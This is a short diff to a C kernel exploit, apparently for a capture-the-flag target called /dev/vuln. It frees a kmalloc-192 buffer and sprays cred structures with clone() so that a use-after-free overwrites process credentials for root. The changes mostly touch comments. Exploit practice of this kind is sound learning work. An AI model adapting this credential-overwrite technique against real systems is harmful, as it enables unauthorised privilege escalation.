@@ -48,9 +48,6 @@ void read_buf(char* data) {
 }
 
 int check_privs(void *arg) {
-	char flag[0x10] = {};
-	int fd;
-
 	while(atomic_load(&try) != true) {
 		sleep(1);
 	}
@@ -73,18 +70,18 @@ int main(void) {
 	assert(fd != -1);
 	puts("[*] Opened /dev/vuln");
 
-	size_t cred_size = 180; // fit in kmalloc 192
+	size_t cred_size = 180; // size to merge in kmalloc 192
 	// There's no kconfig given...
-	// I guess there's no cred_jar so we can uaf kmalloc 192 to overwrite the cred
-	// Maybe CONFIG_MEMCG_KMEM is on
+	// Usually cred is in cred_jar
+	// Maybe CONFIG_MEMCG_KMEM is on so we can uaf kmalloc 192 to overwrite the cred
 	printf("[*] Allocating buffer of size %zu\n", cred_size);
 	alloc_buf(cred_size);
 	char *buffer = malloc(cred_size);
 	puts("[*] Freeing buffer");
 	free_buf();
-#define NUM_CRED_SPRAY 1 // We just need one cred to ocupy the UAF object since the heap is stable(?)
+#define NUM_CRED_SPRAY 1 // We just need one cred to occupy the UAF object since the heap is stable(?)
 	printf("[*] Spraying the heap with %d cred objects using clone()...\n", NUM_CRED_SPRAY);
-	// Code ref: https://r1ru.github.io/posts/3/
+	// Ref: https://r1ru.github.io/posts/3/
 	char stacks[NUM_CRED_SPRAY][0x1000];
 
 	pid_t pids[NUM_CRED_SPRAY];
